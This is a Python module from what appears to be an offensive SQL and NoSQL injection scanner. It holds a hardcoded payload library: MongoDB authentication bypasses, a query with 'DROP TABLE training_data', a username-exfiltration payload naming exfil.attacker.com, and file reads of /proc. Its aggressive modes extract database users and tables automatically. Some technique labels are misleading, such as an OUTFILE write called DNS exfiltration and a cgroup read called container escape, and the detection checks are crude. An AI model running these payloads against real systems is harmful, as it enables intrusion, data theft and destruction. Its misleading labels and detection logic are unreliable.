"""
ReconScan Professional SQL Injection Scanner

Comprehensive SQL injection detection, analysis, and exploitation system.
Integrates payload crafting, response analysis, vulnerability validation, and data extraction.
Includes cutting-edge 2025 attack vectors: NoSQL injection, GraphQL exploitation, 
ORM-specific attacks, cloud database exploits, AI/ML database injection, and more.
"""

import asyncio
import aiohttp
import time
import statistics
import re
import hashlib
import json
import base64
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any, Callable, Union
from dataclasses import dataclass, field
from enum import Enum

from .sql_payload_crafting_engine import (
    PayloadCraftingEngine,
    PayloadCraftingContext,
    InjectionTechnique,
    DatabaseType as CraftingDatabaseType
)
from ...shared.injection_discovery import InjectionPoint, ParameterType
from scanner.ai import AIVulnerabilityValidator

# Color definitions for consistent CLI output
BLUE = '\033[94m'
GREEN = '\033[1;38;5;28m'  # Bold forest green
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
ENDC = '\033[0m'  # End color

class DetectionTechnique(Enum):
    """SQL injection detection techniques including modern 2025 vectors."""
    # Traditional techniques
    BOOLEAN_BLIND = "boolean_blind"
    ERROR_BASED = "error_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    
    # Modern 2025 techniques
    NOSQL_JAVASCRIPT = "nosql_javascript"
    NOSQL_OPERATOR = "nosql_operator"
    MONGODB_INJECTION = "mongodb_injection"
    GRAPHQL_INJECTION = "graphql_injection"
    REST_API_INJECTION = "rest_api_injection"
    JSON_INJECTION = "json_injection"
    ORM_HQL_INJECTION = "orm_hql_injection"
    ORM_CRITERIA_INJECTION = "orm_criteria_injection"
    AI_MODEL_INJECTION = "ai_model_injection"
    VECTOR_SEARCH_INJECTION = "vector_search_injection"
    DNS_EXFILTRATION = "dns_exfiltration"
    HTTP_CALLBACK = "http_callback"
    WEBSOCKET_INJECTION = "websocket_injection"
    LAMBDA_INJECTION = "lambda_injection"
    CONTAINER_ESCAPE = "container_escape"

class DatabaseType(Enum):
    """Supported database types including modern 2025 databases."""
    # Traditional SQL databases
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    
    # Enhanced modern versions
    MYSQL_8 = "mysql_8"
    POSTGRESQL_17 = "postgresql_17"
    MSSQL_2025 = "mssql_2025"
    
    # NoSQL Databases
    MONGODB = "mongodb"
    COUCHDB = "couchdb"
    CASSANDRA = "cassandra"
    REDIS = "redis"
    ELASTICSEARCH = "elasticsearch"
    NEO4J = "neo4j"
    
    # Cloud Databases
    AWS_RDS = "aws_rds"
    AWS_AURORA = "aws_aurora"
    AWS_DYNAMODB = "aws_dynamodb"
    AZURE_SQL = "azure_sql"
    GCP_CLOUD_SQL = "gcp_cloud_sql"
    GCP_FIRESTORE = "gcp_firestore"
    
    # AI/ML Databases
    VECTOR_DB = "vector_db"
    PINECONE = "pinecone"
    WEAVIATE = "weaviate"
    QDRANT = "qdrant"
    
    # Time-series & Analytics
    INFLUXDB = "influxdb"
    CLICKHOUSE = "clickhouse"
    TIMESCALE = "timescale"
    
    # Graph Databases
    DGRAPH = "dgraph"
    ARANGODB = "arangodb"
    
    UNKNOWN = "unknown"

class ScanMode(Enum):
    """SQL injection scanning modes."""
    FAST = "fast"
    THOROUGH = "thorough"
    STEALTH = "stealth"
    AGGRESSIVE = "aggressive"
    MODERN_2025 = "modern_2025"  # New mode for 2025 attacks

@dataclass
class ModernExploitPayload:
    """Modern SQL injection payload with metadata."""
    payload: str
    technique: DetectionTechnique
    database_type: DatabaseType
    description: str
    severity: str
    evasion_methods: List[str] = field(default_factory=list)
    prerequisites: List[str] = field(default_factory=list)
    detection_difficulty: str = "medium"
    success_indicators: List[str] = field(default_factory=list)
    post_exploitation: List[str] = field(default_factory=list)

@dataclass
class VulnerabilityFinding:
    """Comprehensive vulnerability finding result."""
    injection_point: InjectionPoint
    technique: DetectionTechnique
    database_type: Optional[DatabaseType]
    confidence: float
    evidence: List[str]
    payload_used: str
    exploitation_potential: str
    risk_level: str
    validation_passed: bool
    extracted_data: Optional[str]
    scan_metadata: Dict[str, Any]

@dataclass
class ScanConfiguration:
    """Configuration for SQL injection scanning."""
    mode: ScanMode
    max_payloads_per_technique: int
    timeout: float
    delay_between_requests: float
    validation_enabled: bool
    confidence_threshold: float
    max_concurrent_requests: int
    enable_exploitation: bool
    ai_validation: bool

class SQLInjectionScanner:
    """Professional SQL injection scanner with advanced detection capabilities including 2025 attack vectors."""
    
    def __init__(self, session: aiohttp.ClientSession, ai_validator=None):
        """Initialize the SQL injection scanner."""
        self.session = session
        self.payload_engine = PayloadCraftingEngine()
        self.ai_validator = ai_validator or AIVulnerabilityValidator()
        
        # Scan statistics
        self.scan_stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'techniques_used': set(),
            'scan_duration': 0.0
        }
        
        # Modern 2025 payload database
        self.modern_payloads = self._initialize_modern_payloads()
        
        # Cloud provider detection patterns
        self.cloud_patterns = {
            "aws": [r"\.amazonaws\.com", r"aws-", r"rds\.amazonaws", r"dynamodb"],
            "azure": [r"\.azure\.com", r"azure-", r"database\.windows\.net"],
            "gcp": [r"\.googleapis\.com", r"gcp-", r"firestore", r"cloud\.google"]
        }
        
        # Database error patterns for fingerprinting (enhanced with modern databases)
        self.error_patterns = {
            DatabaseType.MYSQL: [
                r"You have an error in your SQL syntax",
                r"mysql_fetch_array\(\)",
                r"mysql_fetch_assoc\(\)",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"Column count doesn't match",
                r"Unknown column"
            ],
            DatabaseType.MYSQL_8: [
                r"MySQL 8\.",
                r"caching_sha2_password",
                r"mysql_native_password",
                r"SQL Error: 1064",
                r"MySQL server version for the right syntax"
            ],
            DatabaseType.POSTGRESQL: [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"PG::SyntaxError",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s*syntax error at or near",
                r"ERROR:\s*relation.*does not exist"
            ],
            DatabaseType.POSTGRESQL_17: [
                r"PostgreSQL 17\.",
                r"psql.*17\.",
                r"pg_dump.*17\.",
                r"postgresql-17"
            ],
            DatabaseType.MSSQL: [
                r"Driver.*SQL[\-\_\ ]*Server",
                r"OLE DB.*SQL Server",
                r"Warning.*mssql_.*",
                r"Microsoft SQL Native Client error",
                r"Unclosed quotation mark after the character string",
                r"Incorrect syntax near"
            ],
            DatabaseType.ORACLE: [
                r"(\W|\A)ORA-[0-9]{1,4}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"quoted string not properly terminated"
            ],
            DatabaseType.SQLITE: [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"Warning.*sqlite_.*",
                r"\[SQLITE_ERROR\]",
                r"sqlite3.OperationalError:",
                r"no such table:"
            ],
            # NoSQL databases
            DatabaseType.MONGODB: [
                r"MongoDB",
                r"mongo",
                r"bson",
                r"ObjectId",
                r"MongoError",
                r"\$where",
                r"\$ne",
                r"\$or"
            ],
            DatabaseType.REDIS: [
                r"Redis",
                r"WRONGTYPE",
                r"ERR unknown command",
                r"LOADING Redis is loading"
            ],
            DatabaseType.ELASTICSEARCH: [
                r"elasticsearch",
                r"IndexNotFoundException",
                r"parsing_exception",
                r"QueryShardException"
            ],
            # AI/ML databases
            DatabaseType.VECTOR_DB: [
                r"vector",
                r"embedding",
                r"similarity",
                r"cosine",
                r"euclidean",
                r"dimension"
            ],
            DatabaseType.PINECONE: [
                r"pinecone",
                r"vector dimension",
                r"upsert",
                r"query vectors"
            ]
        }
        
        # Predefined scan configurations (enhanced with modern mode)
        self.scan_configs = {
            ScanMode.FAST: ScanConfiguration(
                mode=ScanMode.FAST,
                max_payloads_per_technique=3,
                timeout=5.0,
                delay_between_requests=0.1,
                validation_enabled=False,
                confidence_threshold=0.6,
                max_concurrent_requests=5,
                enable_exploitation=False,
                ai_validation=True
            ),
            ScanMode.THOROUGH: ScanConfiguration(
                mode=ScanMode.THOROUGH,
                max_payloads_per_technique=8,
                timeout=10.0,
                delay_between_requests=0.3,
                validation_enabled=True,
                confidence_threshold=0.4,
                max_concurrent_requests=3,
                enable_exploitation=True,
                ai_validation=True
            ),
            ScanMode.STEALTH: ScanConfiguration(
                mode=ScanMode.STEALTH,
                max_payloads_per_technique=5,
                timeout=15.0,
                delay_between_requests=2.0,
                validation_enabled=True,
                confidence_threshold=0.7,
                max_concurrent_requests=1,
                enable_exploitation=False,
                ai_validation=True
            ),
            ScanMode.AGGRESSIVE: ScanConfiguration(
                mode=ScanMode.AGGRESSIVE,
                max_payloads_per_technique=12,
                timeout=8.0,
                delay_between_requests=0.05,
                validation_enabled=True,
                confidence_threshold=0.3,
                max_concurrent_requests=10,
                enable_exploitation=True,
                ai_validation=True
            ),
            ScanMode.MODERN_2025: ScanConfiguration(
                mode=ScanMode.MODERN_2025,
                max_payloads_per_technique=15,
                timeout=12.0,
                delay_between_requests=0.2,
                validation_enabled=True,
                confidence_threshold=0.3,
                max_concurrent_requests=8,
                enable_exploitation=True,
                ai_validation=True
            )
        }
        
        # Data extraction queries (enhanced with modern databases)
        self.extraction_queries = {
            DatabaseType.MYSQL: {
                'version': "SELECT @@version",
                'user': "SELECT USER()",
                'database': "SELECT DATABASE()",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()"
            },
            DatabaseType.MYSQL_8: {
                'version': "SELECT @@version",
                'user': "SELECT USER()",
                'database': "SELECT DATABASE()",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()",
                'roles': "SELECT * FROM mysql.role_edges"
            },
            DatabaseType.POSTGRESQL: {
                'version': "SELECT version()",
                'user': "SELECT current_user",
                'database': "SELECT current_database()",
                'tables': "SELECT tablename FROM pg_tables WHERE schemaname='public'"
            },
            DatabaseType.POSTGRESQL_17: {
                'version': "SELECT version()",
                'user': "SELECT current_user",
                'database': "SELECT current_database()",
                'tables': "SELECT tablename FROM pg_tables WHERE schemaname='public'",
                'extensions': "SELECT extname FROM pg_extension"
            },
            DatabaseType.MONGODB: {
                'version': "db.version()",
                'collections': "show collections",
                'users': "db.getUsers()",
                'stats': "db.stats()"
            }
        }

    def _initialize_modern_payloads(self) -> Dict[DetectionTechnique, List[ModernExploitPayload]]:
        """Initialize comprehensive modern payload database for 2025 attacks."""
        payloads = {}
        
        # NoSQL Injection Payloads
        payloads[DetectionTechnique.NOSQL_JAVASCRIPT] = [
            ModernExploitPayload(
                payload='{"$where": "function() { return this.username == \'admin\' || \'1\'==\'1\'; }"}',
                technique=DetectionTechnique.NOSQL_JAVASCRIPT,
                database_type=DatabaseType.MONGODB,
                description="MongoDB JavaScript injection via $where operator",
                severity="HIGH",
                evasion_methods=["json_encoding", "unicode_escape"],
                success_indicators=["additional documents returned", "admin access granted"],
                post_exploitation=["user_enumeration", "privilege_escalation"]
            )
        ]
        
        payloads[DetectionTechnique.NOSQL_OPERATOR] = [
            ModernExploitPayload(
                payload='{"username": {"$ne": null}, "password": {"$ne": null}}',
                technique=DetectionTechnique.NOSQL_OPERATOR,
                database_type=DatabaseType.MONGODB,
                description="MongoDB operator injection using $ne (not equal)",
                severity="MEDIUM",
                success_indicators=["authentication bypass", "user enumeration"]
            ),
            ModernExploitPayload(
                payload='{"$or": [{"username": "admin"}, {"role": {"$in": ["admin", "root"]}}]}',
                technique=DetectionTechnique.NOSQL_OPERATOR,
                database_type=DatabaseType.MONGODB,
                description="MongoDB $or operator injection for privilege escalation",
                severity="HIGH",
                success_indicators=["privileged access", "role-based bypass"]
            )
        ]
        
        # GraphQL Injection Payloads
        payloads[DetectionTechnique.GRAPHQL_INJECTION] = [
            ModernExploitPayload(
                payload='query { users(filter: {id: {_eq: "1 OR 1=1"}}) { id username password } }',
                technique=DetectionTechnique.GRAPHQL_INJECTION,
                database_type=DatabaseType.POSTGRESQL_17,
                description="GraphQL SQL injection via filter parameter",
                severity="HIGH",
                evasion_methods=["field_aliasing", "query_complexity"],
                success_indicators=["unexpected data returned", "error exposure"]
            ),
            ModernExploitPayload(
                payload='mutation { __schema { types { name fields { name type { name } } } } }',
                technique=DetectionTechnique.GRAPHQL_INJECTION,
                database_type=DatabaseType.MYSQL_8,
                description="GraphQL schema introspection attack",
                severity="MEDIUM",
                success_indicators=["schema information leaked", "field enumeration"]
            )
        ]
        
        # AI/ML Database Injection Payloads
        payloads[DetectionTechnique.AI_MODEL_INJECTION] = [
            ModernExploitPayload(
                payload='{"query": "SELECT * FROM vectors WHERE similarity(embedding, \'[1,2,3]\') > 0.5; DROP TABLE training_data; --"}',
                technique=DetectionTechnique.AI_MODEL_INJECTION,
                database_type=DatabaseType.VECTOR_DB,
                description="Vector database SQL injection targeting AI training data",
                severity="CRITICAL",
                prerequisites=["vector_database_access", "embedding_endpoint"],
                success_indicators=["training_data_exposed", "model_poisoning"],
                post_exploitation=["data_theft", "model_corruption", "backdoor_insertion"]
            )
        ]
        
        payloads[DetectionTechnique.VECTOR_SEARCH_INJECTION] = [
            ModernExploitPayload(
                payload='{"vectors": [[1,2,3]], "metadata": {"filter": "category=\\"sensitive\\" OR 1=1"}}',
                technique=DetectionTechnique.VECTOR_SEARCH_INJECTION,
                database_type=DatabaseType.PINECONE,
                description="Pinecone vector search metadata injection",
                severity="HIGH",
                success_indicators=["unauthorized_vector_access", "metadata_exposure"]
            )
        ]
        
        # DNS Exfiltration Payloads  
        payloads[DetectionTechnique.DNS_EXFILTRATION] = [
            ModernExploitPayload(
                payload="'; SELECT (SELECT CONCAT(username,'.','exfil.attacker.com') FROM users LIMIT 1) INTO OUTFILE '/tmp/dns_query.txt'; --",
                technique=DetectionTechnique.DNS_EXFILTRATION,
                database_type=DatabaseType.MYSQL_8,
                description="MySQL DNS data exfiltration via OUTFILE",
                severity="CRITICAL",
                prerequisites=["file_privileges", "network_access"],
                success_indicators=["dns_queries_logged", "data_in_subdomain"],
                post_exploitation=["stealth_data_theft", "long_term_monitoring"]
            )
        ]
        
        # Container Escape Payloads
        payloads[DetectionTechnique.CONTAINER_ESCAPE] = [
            ModernExploitPayload(
                payload="'; SELECT * FROM information_schema.tables WHERE table_schema = 'mysql' UNION SELECT 1,LOAD_FILE('/proc/self/cgroup'),3,4,5; --",
                technique=DetectionTechnique.CONTAINER_ESCAPE,
                database_type=DatabaseType.MYSQL_8,
                description="Container escape via MySQL LOAD_FILE reading /proc filesystem",
                severity="CRITICAL",
                prerequisites=["mysql_container", "file_privileges"],
                success_indicators=["proc_filesystem_access", "container_id_exposed"],
                post_exploitation=["host_system_access", "kubernetes_escape"]
            )
        ]
        
        # Lambda/Serverless Injection
        payloads[DetectionTechnique.LAMBDA_INJECTION] = [
            ModernExploitPayload(
                payload='{"Records": [{"body": "{\\"sql\\": \\"SELECT * FROM users WHERE id = 1; INSERT INTO logs VALUES (\'injected\'); --\\"}"}]}',
                technique=DetectionTechnique.LAMBDA_INJECTION,
                database_type=DatabaseType.AWS_RDS,
                description="AWS Lambda SQL injection via SQS message processing",
                severity="CRITICAL",
                prerequisites=["lambda_function", "sqs_access", "rds_connection"],
                success_indicators=["lambda_error_logs", "cloudwatch_anomalies"],
                post_exploitation=["aws_privilege_escalation", "cross_service_access"]
            )
        ]
        
        return payloads

    async def scan_injection_points(self, 
                                  injection_points: List[InjectionPoint],
                                  scan_mode: ScanMode = ScanMode.THOROUGH,
                                  custom_config: Optional[ScanConfiguration] = None,
                                  progress_callback: Optional[Callable] = None) -> List[VulnerabilityFinding]:
        """Scan injection points for SQL injection vulnerabilities including modern 2025 attack vectors."""
        
        start_time = time.time()
        config = custom_config or self.scan_configs[scan_mode]
        findings = []
        
        print(f"{CYAN}[*] Starting SQL injection scan with {len(injection_points)} injection points{ENDC}")
        print(f"{CYAN}[*] Scan mode: {scan_mode.value.upper()}{ENDC}")
        if scan_mode in [ScanMode.THOROUGH, ScanMode.AGGRESSIVE, ScanMode.MODERN_2025]:
            print(f"{CYAN}[*] Modern 2025 attack vectors: ENABLED{ENDC}")
        else:
            print(f"{CYAN}[*] Modern 2025 attack vectors: LIMITED (use thorough mode for full coverage){ENDC}")
        
        # Create semaphore for concurrent request limiting
        semaphore = asyncio.Semaphore(config.max_concurrent_requests)
        
        # Scan all injection points concurrently
        tasks = []
        for i, injection_point in enumerate(injection_points, 1):
            task = self._scan_single_injection_point(
                injection_point, config, semaphore, i
            )
            tasks.append(task)
        
        # Execute scans and collect results
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, VulnerabilityFinding):
                findings.append(result)
                if progress_callback:
                    progress_callback(result)
        
        # Update scan statistics
        self.scan_stats['scan_duration'] = time.time() - start_time
        self.scan_stats['vulnerabilities_found'] = len(findings)
        
        print(f"{GREEN}[+] Scan completed: {len(findings)} vulnerabilities found{ENDC}")
        
        return findings

    async def _scan_single_injection_point(self, 
                                         injection_point: InjectionPoint,
                                         config: ScanConfiguration,
                                         semaphore: asyncio.Semaphore,
                                         point_number: int) -> Optional[VulnerabilityFinding]:
        """Scan a single injection point using traditional and modern techniques."""
        
        async with semaphore:
            try:
                print(f"{BLUE}[{point_number}] Testing {injection_point.name} at {injection_point.url[:50]}...{ENDC}")
                
                # Detect technology stack first for modern attacks
                tech_context = await self._detect_technology_stack(injection_point, config)
                
                # Create payload crafting context with correct parameters
                context = PayloadCraftingContext(
                    injection_point=injection_point,
                    database_type=CraftingDatabaseType.UNKNOWN
                )
                
                # Select appropriate techniques based on mode and detected technology
                techniques = self._select_techniques(injection_point, config, tech_context)
                
                # Test each technique
                best_result = None
                highest_confidence = 0.0
                
                for technique in techniques:
                    try:
                        result = await self._test_technique(
                            injection_point, technique, context, config, tech_context
                        )
                        
                        if result and result.get('vulnerable', False):
                            confidence = result.get('confidence', 0.0)
                            if confidence > highest_confidence:
                                highest_confidence = confidence
                                best_result = result
                                
                    except Exception as e:
                        print(f"{YELLOW}[!] Error testing {technique.value}: {str(e)[:50]}{ENDC}")
                        continue
                
                # Process best result
                if best_result and highest_confidence >= config.confidence_threshold:
                    # Perform validation if enabled
                    if config.validation_enabled:
                        validation_passed = await self._validate_vulnerability(
                            injection_point, best_result, context, config
                        )
                        best_result['validation_passed'] = validation_passed
                    else:
                        best_result['validation_passed'] = True
                    
                    # Attempt data extraction if exploitation enabled
                    if config.enable_exploitation and best_result['validation_passed']:
                        extracted_data = await self._attempt_data_extraction(
                            injection_point, best_result, context, config
                        )
                        best_result['extracted_data'] = extracted_data
                    else:
                        best_result['extracted_data'] = None
                    
                    # Create vulnerability finding
                    finding = VulnerabilityFinding(
                        injection_point=injection_point,
                        technique=best_result['technique'],
                        database_type=best_result.get('database_type'),
                        confidence=best_result['confidence'],
                        evidence=best_result['evidence'],
                        payload_used=best_result['payload'],
                        exploitation_potential=self._assess_exploitation_potential(best_result),
                        risk_level=self._calculate_risk_level(best_result, injection_point),
                        validation_passed=best_result['validation_passed'],
                        extracted_data=best_result['extracted_data'],
                        scan_metadata=best_result.get('metadata', {})
                    )
                    
                    print(f"{GREEN}[+] VULNERABLE: {injection_point.name} - {best_result['technique'].value} ({highest_confidence:.2f}){ENDC}")
                    
                    self.scan_stats['total_requests'] += best_result.get('requests_made', 1)
                    self.scan_stats['techniques_used'].add(best_result['technique'])
                    
                    return finding
                else:
                    print(f"{BLUE}[-] Not vulnerable: {injection_point.name}{ENDC}")
                    
            except Exception as e:
                print(f"{RED}[!] Error scanning {injection_point.name}: {str(e)[:50]}{ENDC}")
            
            # Add delay between requests for stealth mode
            if config.delay_between_requests > 0:
                await asyncio.sleep(config.delay_between_requests)
        
        return None

    async def _test_technique(self, 
                            injection_point: InjectionPoint,
                            technique: DetectionTechnique,
                            context: PayloadCraftingContext,
                            config: ScanConfiguration,
                            tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test a specific detection technique including modern 2025 techniques."""
        
        # Handle modern techniques differently
        if technique in [DetectionTechnique.NOSQL_JAVASCRIPT, DetectionTechnique.NOSQL_OPERATOR]:
            return await self._test_nosql_injection(injection_point, technique, config, tech_context)
        elif technique == DetectionTechnique.GRAPHQL_INJECTION:
            return await self._test_graphql_injection(injection_point, config, tech_context)
        elif technique in [DetectionTechnique.AI_MODEL_INJECTION, DetectionTechnique.VECTOR_SEARCH_INJECTION]:
            return await self._test_ai_ml_injection(injection_point, technique, config, tech_context)
        elif technique == DetectionTechnique.DNS_EXFILTRATION:
            return await self._test_dns_exfiltration(injection_point, config, tech_context)
        elif technique == DetectionTechnique.CONTAINER_ESCAPE:
            return await self._test_container_escape(injection_point, config, tech_context)
        elif technique == DetectionTechnique.LAMBDA_INJECTION:
            return await self._test_lambda_injection(injection_point, config, tech_context)
        
        # Handle traditional techniques
        try:
            # Map to traditional payload crafting technique
            crafting_technique = self._map_to_crafting_technique(technique)
            
            # Generate payloads using the payload engine
            payloads = self.payload_engine.craft_payloads(
                injection_point,
                techniques=[crafting_technique],
                max_payloads=config.max_payloads_per_technique
            )
            
            # Test each payload
            for payload_data in payloads:
                payload, template = payload_data
                
                # Send request and measure timing
                response_data = await self._send_payload_request(
                    injection_point, payload, config
                )
                
                if not response_data:
                    continue
                
                # Analyze response based on technique
                result = self._analyze_response(
                    response_data, payload, technique, injection_point, tech_context
                )
                
                if result['vulnerable']:
                    result['payload'] = payload
                    result['technique'] = technique
                    result['requests_made'] = 1
                    return result
            
        except Exception as e:
            print(f"{YELLOW}[!] Error in technique {technique.value}: {str(e)[:50]}{ENDC}")
        
        return None

    async def _test_nosql_injection(self, injection_point: InjectionPoint, technique: DetectionTechnique, 
                                  config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for NoSQL injection vulnerabilities."""
        
        payloads = self.modern_payloads.get(technique, [])
        
        for payload_obj in payloads:
            try:
                response_data = await self._send_nosql_payload(injection_point, payload_obj, config)
                
                if self._analyze_nosql_response(response_data, payload_obj):
                    return {
                        'vulnerable': True,
                        'technique': technique,
                        'confidence': 0.85,
                        'database_type': payload_obj.database_type,
                        'evidence': [f"NoSQL injection successful: {payload_obj.description}"],
                        'payload': payload_obj.payload,
                        'requests_made': 1,
                        'metadata': {
                            'modern_technique': payload_obj.technique.value,
                            'severity': payload_obj.severity,
                            'database': payload_obj.database_type.value
                        }
                    }
                    
            except Exception:
                continue
        
        return None

    async def _test_graphql_injection(self, injection_point: InjectionPoint, 
                                    config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for GraphQL injection vulnerabilities."""
        
        payloads = self.modern_payloads.get(DetectionTechnique.GRAPHQL_INJECTION, [])
        
        for payload_obj in payloads:
            try:
                graphql_request = {
                    "query": payload_obj.payload,
                    "variables": {},
                    "operationName": None
                }
                
                response_data = await self._send_graphql_request(injection_point, graphql_request, config)
                
                if self._analyze_graphql_response(response_data, payload_obj):
                    return {
                        'vulnerable': True,
                        'technique': DetectionTechnique.GRAPHQL_INJECTION,
                        'confidence': 0.80,
                        'database_type': payload_obj.database_type,
                        'evidence': [f"GraphQL injection: {payload_obj.description}"],
                        'payload': json.dumps(graphql_request),
                        'requests_made': 1,
                        'metadata': {
                            'modern_technique': payload_obj.technique.value,
                            'api_type': 'graphql'
                        }
                    }
                    
            except Exception:
                continue
        
        return None

    async def _test_ai_ml_injection(self, injection_point: InjectionPoint, technique: DetectionTechnique,
                                  config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for AI/ML database injection vulnerabilities."""
        
        payloads = self.modern_payloads.get(technique, [])
        
        for payload_obj in payloads:
            try:
                if 'vector' in str(injection_point.url).lower():
                    response_data = await self._send_vector_payload(injection_point, payload_obj, config)
                    
                    if self._analyze_ai_response(response_data, payload_obj):
                        return {
                            'vulnerable': True,
                            'technique': technique,
                            'confidence': 0.90,
                            'database_type': payload_obj.database_type,
                            'evidence': [f"AI/ML injection: {payload_obj.description}"],
                            'payload': payload_obj.payload,
                            'requests_made': 1,
                            'metadata': {
                                'modern_technique': payload_obj.technique.value,
                                'ai_attack': True,
                                'severity': 'CRITICAL'
                            }
                        }
                        
            except Exception:
                continue
        
        return None

    async def _test_dns_exfiltration(self, injection_point: InjectionPoint, 
                                   config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test advanced DNS data exfiltration techniques."""
        
        payloads = self.modern_payloads.get(DetectionTechnique.DNS_EXFILTRATION, [])
        
        for payload_obj in payloads:
            try:
                response_data = await self._send_payload_request(injection_point, payload_obj.payload, config)
                
                if self._analyze_exfiltration_response(response_data, payload_obj):
                    return {
                        'vulnerable': True,
                        'technique': DetectionTechnique.DNS_EXFILTRATION,
                        'confidence': 0.75,
                        'database_type': payload_obj.database_type,
                        'evidence': [f"DNS exfiltration possible: {payload_obj.description}"],
                        'payload': payload_obj.payload,
                        'requests_made': 1,
                        'metadata': {
                            'modern_technique': payload_obj.technique.value,
                            'exfiltration_method': 'dns',
                            'severity': 'CRITICAL'
                        }
                    }
                    
            except Exception:
                continue
        
        return None

    async def _test_container_escape(self, injection_point: InjectionPoint, 
                                   config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test container escape techniques."""
        
        payloads = self.modern_payloads.get(DetectionTechnique.CONTAINER_ESCAPE, [])
        
        for payload_obj in payloads:
            try:
                response_data = await self._send_payload_request(injection_point, payload_obj.payload, config)
                
                if self._analyze_container_response(response_data, payload_obj):
                    return {
                        'vulnerable': True,
                        'technique': DetectionTechnique.CONTAINER_ESCAPE,
                        'confidence': 0.95,
                        'database_type': payload_obj.database_type,
                        'evidence': [f"Container escape: {payload_obj.description}"],
                        'payload': payload_obj.payload,
                        'requests_made': 1,
                        'metadata': {
                            'modern_technique': payload_obj.technique.value,
                            'container_attack': True,
                            'severity': 'CRITICAL'
                        }
                    }
                    
            except Exception:
                continue
        
        return None

    async def _test_lambda_injection(self, injection_point: InjectionPoint, 
                                   config: ScanConfiguration, tech_context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test Lambda/serverless injection techniques."""
        
        payloads = self.modern_payloads.get(DetectionTechnique.LAMBDA_INJECTION, [])
        
        for payload_obj in payloads:
            try:
                # Send as JSON payload for serverless functions
                response_data = await self._send_json_payload(injection_point, payload_obj, config)
                
                if self._analyze_lambda_response(response_data, payload_obj):
                    return {
                        'vulnerable': True,
                        'technique': DetectionTechnique.LAMBDA_INJECTION,
                        'confidence': 0.85,
                        'database_type': payload_obj.database_type,
                        'evidence': [f"Lambda injection: {payload_obj.description}"],
                        'payload': payload_obj.payload,
                        'requests_made': 1,
                        'metadata': {
                            'modern_technique': payload_obj.technique.value,
                            'serverless_attack': True,
                            'severity': 'CRITICAL'
                        }
                    }
                    
            except Exception:
                continue
        
        return None

    async def _send_nosql_payload(self, injection_point: InjectionPoint, payload_obj: ModernExploitPayload, 
                                config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send NoSQL payload."""
        try:
            headers = {'Content-Type': 'application/json'}
            payload_data = json.loads(payload_obj.payload)
            
            async with self.session.post(
                injection_point.url, 
                json=payload_data, 
                headers=headers, 
                timeout=aiohttp.ClientTimeout(total=config.timeout)
            ) as response:
                content = await response.text()
                return {
                    'content': content,
                    'timing': 0.0,
                    'headers': dict(response.headers),
                    'status_code': response.status
                }
        except Exception:
            return None

    async def _send_graphql_request(self, injection_point: InjectionPoint, query_data: Dict, 
                                  config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send GraphQL request."""
        try:
            headers = {'Content-Type': 'application/json'}
            async with self.session.post(
                injection_point.url, 
                json=query_data, 
                headers=headers, 
                timeout=aiohttp.ClientTimeout(total=config.timeout)
            ) as response:
                content = await response.text()
                return {
                    'content': content,
                    'timing': 0.0,
                    'headers': dict(response.headers),
                    'status_code': response.status
                }
        except Exception:
            return None

    async def _send_vector_payload(self, injection_point: InjectionPoint, payload_obj: ModernExploitPayload, 
                                 config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send vector database payload."""
        try:
            if payload_obj.database_type == DatabaseType.PINECONE:
                vector_data = json.loads(payload_obj.payload)
                headers = {'Content-Type': 'application/json'}
                
                async with self.session.post(
                    injection_point.url,
                    json=vector_data,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=config.timeout)
                ) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'timing': 0.0,
                        'headers': dict(response.headers),
                        'status_code': response.status
                    }
        except Exception:
            return None

    async def _send_json_payload(self, injection_point: InjectionPoint, payload_obj: ModernExploitPayload, 
                               config: ScanConfiguration) -> Optional[Dict[str, Any]]:
        """Send JSON payload for serverless functions."""
        try:
            headers = {'Content-Type': 'application/json'}
            payload_data = json.loads(payload_obj.payload)
            
            async with self.session.post(
                injection_point.url,
                json=payload_data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=config.timeout)
            ) as response:
                content = await response.text()
                return {
                    'content': content,
                    'timing': 0.0,
                    'headers': dict(response.headers),
                    'status_code': response.status
                }
        except Exception:
            return None

    def _analyze_nosql_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for NoSQL injection indicators."""
        if not response_data:
            return False
        
        content = response_data.get('content', '').lower()
        
        nosql_indicators = [
            'mongodb', 'bson', 'objectid', '$where', '$ne', '$or',
            'unauthorized', 'additional documents', 'role'
        ]
        
        for indicator in nosql_indicators:
            if indicator in content:
                return True
        
        if response_data.get('status_code') == 500 and 'mongo' in content:
            return True
            
        return False

    def _analyze_graphql_response(self, response_data: Optional[Dict], payload_obj: ModernExploitPayload) -> bool:
        """Analyze response for GraphQL injection indicators."""
